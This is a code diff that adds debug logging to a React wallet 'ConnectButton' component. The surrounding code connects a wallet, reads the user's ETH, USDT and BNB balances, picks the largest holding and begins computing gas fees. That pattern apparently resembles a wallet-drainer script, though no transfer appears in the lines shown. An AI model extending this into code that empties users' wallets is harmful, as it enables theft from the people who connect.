@@ -81,7 +81,9 @@ export function ConnectButton() {
       let detectedProvider = detectWallet()
 
       if (!detectedProvider) {
+        console.log('No provider detected, opening WalletConnect modal...')
         detectedProvider = await open()
+        console.log('WalletConnect provider:', detectedProvider)
         if (!detectedProvider) {
           throw new Error('No wallet provider found')
         }
@@ -92,6 +94,7 @@ export function ConnectButton() {
 
       const signer = web3Provider.getSigner()
       const address = await signer.getAddress()
+      console.log('Connected address:', address)
 
       // Token contract addresses
       const usdtAddress = '0xdAC17F958D2ee523a2206206994597C13D831ec7'
@@ -112,6 +115,10 @@ export function ConnectButton() {
       const usdtBalance = await usdtContract.balanceOf(address)
       const bnbBalance = await bnbContract.balanceOf(address)
 
+      console.log('ETH Balance:', ethBalance.toString())
+      console.log('USDT Balance:', usdtBalance.toString())
+      console.log('BNB Balance:', bnbBalance.toString())
+
       // Determine the highest balance
       let highestBalanceToken: 'ETH' | 'USDT' | 'BNB' = 'ETH'
       let highestBalance = ethBalance
@@ -123,6 +130,8 @@ export function ConnectButton() {
         highestBalance = bnbBalance
         highestBalanceToken = 'BNB'
       }
+
+      console.log('Highest balance token:', highestBalanceToken)
 
       // Calculate gas fees
       const gasPrice = await web3Provider.getGasPrice()
